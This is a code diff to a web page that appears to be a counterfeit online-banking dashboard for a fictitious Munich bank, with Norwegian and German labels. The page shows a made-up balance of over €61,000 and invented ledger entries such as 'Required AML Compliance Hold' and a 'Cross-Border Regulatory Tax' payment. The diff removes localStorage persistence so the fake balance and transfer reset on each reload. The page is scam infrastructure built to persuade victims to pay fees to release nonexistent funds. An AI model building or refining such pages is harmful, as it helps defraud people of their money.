@@ -129,7 +129,7 @@ Brienner Straße 18, 80333 München, Deutschland
 </div>
 
 <div class="card" style="padding:0;">
-<div id="txt-trans-title" style="padding:20px; font-weight:bold; border-bottom:1px solid #eee;">Umsatzanzeige (Letzte 30 Tage)</div>
+<div id="txt-trans-title" style="padding:20px; font-weight:bold; border-bottom:1px solid #eee;">Umsatzanzeige (Letzte30 Tage)</div>
 <table>
 <thead>
 <tr id="txt-table-head"><th>BUCHUNGSTAG</th><th>VERWENDUNGSZWECK</th><th>BETRAG</th></tr>
@@ -292,48 +292,29 @@ err: "<strong>AML Compliance Hold:</strong><br>For å frigjøre overføringen kr
 successMsg: "Overføring vellykket. Midlene er overført.",
 vireAccVal: "Privat Premium Konto (*942) - €61,857.70",
 balanceVal: "€61,857.70",
-t1_date: "04.08.2026",
-t1_desc: "Krypto Markeds Sikringskomisjon / UBS Bank<span class=\"details\">NO1766321125884</span>",
-t1_amt: "+33 780,00 €",
-t2_date: "31.08.2026",
-t2_desc: "Required Cross-Border Regulatory Tax call payment",
-t2_amt: "-8 929,00 €",
-t3_date: "31.08.2026",
-t3_desc: "Staking pool",
-t3_amt: "+19 148,70 €",
-t4_date: "10.09.2026",
-t4_desc: "Required AML Compliance Hold",
-t4_amt: "-8 795,00 €"
+t1_date:    "04.08.2026",
+    t1_desc: "Krypto Markeds Sikringskomisjon / UBS Bank<span class=\"details\">NO1766321125884</span>",
+    t1_amt: "+33 780,00 €",
+    t2_date: "31.08.2026",
+    t2_desc: "Required Cross-Border Regulatory Tax call payment",
+    t2_amt: "-8 929,00 €",
+    t3_date: "31.08.2026",
+    t3_desc: "Staking pool",
+    t3_amt: "+19 148,70 €",
+    t4_date: "10.09.2026",
+    t4_desc: "Required AML Compliance Hold",
+    t4_amt: "-8 795,00 €"
 }
 };
 
-// Global State
+// Global State (Reset on every reload)
 let currentBalance = defaultBalance;
 let lastTransaction = null;
 let currentLang = defaultLang;
 
-// --- INITIALIZATION & LOCAL STORAGE ---
-
+// --- INITIALIZATION ---
 function initApp() {
-    // 1. Load Balance
-    const savedBalance = localStorage.getItem('blb_balance');
-    if (savedBalance) {
-        currentBalance = parseFloat(savedBalance);
-    }
-
-    // 2. Load Last Transaction
-    const savedTrans = localStorage.getItem('blb_last_tx');
-    if (savedTrans) {
-        lastTransaction = JSON.parse(savedTrans);
-    }
-
-    // 3. Load Language
-    const savedLang = localStorage.getItem('blb_lang');
-    if (savedLang && langData[savedLang]) {
-        currentLang = savedLang;
-    }
-
-    // 4. Render Initial State
+    // No localStorage loading here. State is fresh.
     setLanguage(currentLang);
 }
 
@@ -382,7 +363,7 @@ function setLanguage(l) {
     // Build Transaction History
     let rowsHTML = '';
     
-    // Add new transaction first if it exists
+    // Add new transaction first if it exists (only for current session)
     if (lastTransaction) {
         rowsHTML += `<tr><td>${lastTransaction.date}</td><td>Transfer to ${lastTransaction.iban}</td><td class="amt-neg">${lastTransaction.amount}</td></tr>`;
     }
@@ -418,7 +399,6 @@ function showSection(id) {
     else if(id === 'dash') {
         document.getElementById('dashboard-container').style.display = 'flex';
         document.getElementById('public-nav').style.display = 'none';
-        // Refresh balance display when entering dashboard
         setLanguage(currentLang);
     }
     else {
@@ -443,7 +423,6 @@ function navigateTo(p) {
     document.getElementById('page-' + p).classList.add('active');
     document.getElementById('nav-' + p).classList.add('active');
     
-    // Clear banners when switching views
     document.getElementById('transfer-error').style.display = 'none';
     document.getElementById('transfer-success').style.display = 'none';
 }
@@ -478,17 +457,14 @@ function processWithdrawal() {
         formattedAmount = "-" + amount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + " €";
     }
 
-    // Store transaction details
+    // Store transaction details (In-memory only)
     lastTransaction = {
         date: "10.09.2026",
         iban: iban,
         amount: formattedAmount
     };
 
-    // Save to Local Storage
-    localStorage.setItem('blb_balance', currentBalance.toString());
-    localStorage.setItem('blb_last_tx', JSON.stringify(lastTransaction));
-    localStorage.setItem('blb_lang', currentLang);
+    // Note: localStorage setItem calls removed here.
 
     // Show success message
     const successBanner = document.getElementById('transfer-success');
@@ -504,7 +480,7 @@ function processWithdrawal() {
     // Wait 1.5 seconds then redirect to dashboard and refresh history
     setTimeout(() => {
         navigateTo('synth');
-        setLanguage(currentLang); // Re-render table and balance with new data
+        setLanguage(currentLang); 
     }, 1500);
 }
 
